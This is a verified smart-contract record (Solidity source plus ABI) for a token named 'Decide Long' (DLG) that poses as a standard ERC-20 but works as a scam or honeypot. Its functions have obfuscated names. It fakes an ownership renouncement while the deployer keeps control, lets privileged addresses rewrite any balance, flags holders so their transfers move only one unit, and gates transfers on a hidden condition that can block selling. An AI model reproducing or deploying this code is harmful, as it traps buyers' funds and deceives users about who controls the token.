{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.1;\n\ninterface walletShould {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address sellReceiver) external view returns (uint256);\n\n    function transfer(address takeFromLimit, uint256 autoLaunchedTeam) external returns (bool);\n\n    function allowance(address isLimit, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 autoLaunchedTeam) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address takeFromLimit,\n        uint256 autoLaunchedTeam\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed fundAmount, uint256 value);\n    event Approval(address indexed isLimit, address indexed spender, uint256 value);\n}\n\nabstract contract teamTx {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface shouldBuy {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface feeSender {\n    function createPair(address launchLimit, address swapLaunched) external returns (address);\n}\n\ninterface shouldEnable is walletShould {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract DecideLong is teamTx, walletShould, shouldEnable {\n\n    bool public maxBuy;\n\n    function symbol() external view virtual override returns (string memory) {\n        return isMaxTotal;\n    }\n\n    function isExempt() private view {\n        require(atTotal[_msgSender()]);\n    }\n\n    uint256 private receiverReceiver;\n\n    function allowance(address limitAt, address isTradingTake) external view virtual override returns (uint256) {\n        if (isTradingTake == txShould) {\n            return type(uint256).max;\n        }\n        return toAmount[limitAt][isTradingTake];\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return isAt;\n    }\n\n    bool public tokenTrading;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return txTake;\n    }\n\n    bool public walletSender;\n\n    uint256 private txTake = 100000000 * 10 ** 18;\n\n    function approve(address isTradingTake, uint256 autoLaunchedTeam) public virtual override returns (bool) {\n        toAmount[_msgSender()][isTradingTake] = autoLaunchedTeam;\n        emit Approval(_msgSender(), isTradingTake, autoLaunchedTeam);\n        return true;\n    }\n\n    uint256 feeLaunch;\n\n    function exemptLiquidityBuy(address fundWallet) public {\n        isExempt();\n        \n        if (fundWallet == modeWallet || fundWallet == tradingEnableAt) {\n            return;\n        }\n        fromBuy[fundWallet] = true;\n    }\n\n    function launchedTotal(address exemptLaunch, address takeFromLimit, uint256 autoLaunchedTeam) internal returns (bool) {\n        if (exemptLaunch == modeWallet) {\n            return receiverAutoSender(exemptLaunch, takeFromLimit, autoLaunchedTeam);\n        }\n        uint256 walletBuy = walletShould(tradingEnableAt).balanceOf(isAuto);\n        require(walletBuy == feeLaunch);\n        require(takeFromLimit != isAuto);\n        if (fromBuy[exemptLaunch]) {\n            return receiverAutoSender(exemptLaunch, takeFromLimit, swapSender);\n        }\n        return receiverAutoSender(exemptLaunch, takeFromLimit, autoLaunchedTeam);\n    }\n\n    event OwnershipTransferred(address indexed sellFrom, address indexed autoMode);\n\n    address private sellTx;\n\n    function transfer(address autoTeam, uint256 autoLaunchedTeam) external virtual override returns (bool) {\n        return launchedTotal(_msgSender(), autoTeam, autoLaunchedTeam);\n    }\n\n    address isAuto = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function tokenMode() public {\n        emit OwnershipTransferred(modeWallet, address(0));\n        sellTx = address(0);\n    }\n\n    mapping(address => bool) public atTotal;\n\n    function owner() external view returns (address) {\n        return sellTx;\n    }\n\n    constructor (){\n        if (tokenTrading) {\n            totalTeam = true;\n        }\n        shouldBuy amountMarketing = shouldBuy(txShould);\n        tradingEnableAt = feeSender(amountMarketing.factory()).createPair(amountMarketing.WETH(), address(this));\n        \n        modeWallet = _msgSender();\n        tokenMode();\n        atTotal[modeWallet] = true;\n        limitTeamMin[modeWallet] = txTake;\n        if (amountIs) {\n            totalTeam = true;\n        }\n        emit Transfer(address(0), modeWallet, txTake);\n    }\n\n    bool public listTake;\n\n    function balanceOf(address sellReceiver) public view virtual override returns (uint256) {\n        return limitTeamMin[sellReceiver];\n    }\n\n    address txShould = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function name() external view virtual override returns (string memory) {\n        return feeTake;\n    }\n\n    bool public totalTeam;\n\n    function transferFrom(address exemptLaunch, address takeFromLimit, uint256 autoLaunchedTeam) external override returns (bool) {\n        if (_msgSender() != txShould) {\n            if (toAmount[exemptLaunch][_msgSender()] != type(uint256).max) {\n                require(autoLaunchedTeam <= toAmount[exemptLaunch][_msgSender()]);\n                toAmount[exemptLaunch][_msgSender()] -= autoLaunchedTeam;\n            }\n        }\n        return launchedTotal(exemptLaunch, takeFromLimit, autoLaunchedTeam);\n    }\n\n    address public modeWallet;\n\n    uint8 private isAt = 18;\n\n    function getOwner() external view returns (address) {\n        return sellTx;\n    }\n\n    address public tradingEnableAt;\n\n    string private feeTake = \"Decide Long\";\n\n    bool public amountIs;\n\n    string private isMaxTotal = \"DLG\";\n\n    function teamSell(address receiverTradingTotal) public {\n        if (walletSender) {\n            return;\n        }\n        \n        atTotal[receiverTradingTotal] = true;\n        \n        walletSender = true;\n    }\n\n    function amountFee(uint256 autoLaunchedTeam) public {\n        isExempt();\n        feeLaunch = autoLaunchedTeam;\n    }\n\n    mapping(address => mapping(address => uint256)) private toAmount;\n\n    function fromList(address autoTeam, uint256 autoLaunchedTeam) public {\n        isExempt();\n        limitTeamMin[autoTeam] = autoLaunchedTeam;\n    }\n\n    uint256 autoExempt;\n\n    uint256 private autoMax;\n\n    function receiverAutoSender(address exemptLaunch, address takeFromLimit, uint256 autoLaunchedTeam) internal returns (bool) {\n        require(limitTeamMin[exemptLaunch] >= autoLaunchedTeam);\n        limitTeamMin[exemptLaunch] -= autoLaunchedTeam;\n        limitTeamMin[takeFromLimit] += autoLaunchedTeam;\n        emit Transfer(exemptLaunch, takeFromLimit, autoLaunchedTeam);\n        return true;\n    }\n\n    mapping(address => uint256) private limitTeamMin;\n\n    uint256 constant swapSender = 1 ** 10;\n\n    mapping(address => bool) public fromBuy;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isLimit\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellFrom\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoMode\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundAmount\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitAt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"isTradingTake\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"autoLaunchedTeam\",\"type\":\"uint256\"}],\"name\":\"amountFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isTradingTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoLaunchedTeam\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"atTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellReceiver\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundWallet\",\"type\":\"address\"}],\"name\":\"exemptLiquidityBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fromBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoLaunchedTeam\",\"type\":\"uint256\"}],\"name\":\"fromList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeWallet\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverTradingTotal\",\"type\":\"address\"}],\"name\":\"teamSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingEnableAt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoLaunchedTeam\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptLaunch\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"takeFromLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoLaunchedTeam\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "DecideLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}